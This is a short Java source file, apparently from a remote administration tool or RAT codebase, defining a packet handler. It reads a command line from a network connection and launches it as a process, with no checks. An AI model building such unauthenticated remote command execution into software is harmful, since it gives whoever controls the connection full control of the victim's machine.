package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.LaunchProcess;

public class PacketEXECP extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String line = Connection.readLine();
		new LaunchProcess(line).start();
	}

}
